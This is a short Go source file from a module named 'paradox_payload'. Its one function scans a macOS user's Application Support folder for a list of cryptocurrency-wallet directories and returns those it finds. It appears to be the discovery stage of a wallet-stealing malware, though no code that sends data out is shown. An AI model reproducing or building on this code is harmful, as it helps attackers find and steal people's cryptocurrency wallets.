package discovery

import (
	"fmt"
	"os"
	"path/filepath"

	"paradox_payload/static"
)

func CheckCryptoDirectories(homeDir string) ([]string, error) {
	appSupportDir := filepath.Join(homeDir, "Library", "Application Support")
	foundDirs := []string{}

	for _, relPath := range static.CryptoRelativePaths {
		dir := filepath.Join(appSupportDir, relPath)
		if info, err := os.Stat(dir); err == nil && info.IsDir() {
			foundDirs = append(foundDirs, dir)
		} else if !os.IsNotExist(err) {
			fmt.Printf("Error checking crypto directory %s: %v\n", dir, err)
		}
	}

	return foundDirs, nil
}
